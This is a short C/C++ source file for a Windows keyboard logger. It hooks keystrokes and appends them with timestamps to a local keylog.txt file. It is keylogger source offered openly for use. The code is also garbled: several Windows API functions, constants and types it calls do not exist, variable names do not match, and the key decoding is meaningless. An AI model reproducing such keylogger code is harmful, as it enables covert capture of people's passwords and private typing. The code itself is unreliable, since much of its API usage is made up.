### Code:

```c
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <ctime>

using namespace std;

void keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != HCID_KEY)
        return;

    static FILE* file = nullptr;
    static DWORD last_time = 0;
    static int last_timestamp = 0;

    if (wParam == KM_KEYDOWN) {
        DWORD timestamp = GetTickCount();
        if (timestamp != last_timestamp) {
            last_timestamp = timestamp;
            if (file == nullptr) {
                file = fopen("keylog.txt", "a");
                if (!file) {
                    cout << "Failed to create log file." << endl;
                    return;
                }
            }
            fprintf(file, "[%d] ", timestamp);
        }

        BYTE modifiers = GetKeyState(0x0000, 0x0000);
        if (modifiers & 0x00000001) {
            // Shift is pressed
            char c = 'A' + (lParam & 0x1F); // Get the lowest 5 bits for the key number
            fputc(c, file);
        } else {
            char c = 'a' + (lParam & 0x1F);
            fputc(c, file);
        }
        fputc('\n', file);
        fflush(file);
    }
}

int main() {
    HHOOK hhook = SetWindowsHook(WH_KEYBOARD_LL, keyboard_proc);
    if (hook == NULL) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    cout << "Keyboard logger started. Press CTRL+C to exit." << endl;

    while (true) {
        Msg msg;
        GetNextMsg(hhook, &msg);
        if (msg.message == WM_KEYDOWN) {
            continue; // Already handled by callback
        }
        Sleep(25); // Reduce CPU usage
    }

    Unhook(hhook);
    if (file) {
        fclose(file);
        cout << "Keyboard logger stopped." << endl;
    }
    return 0;
}
```

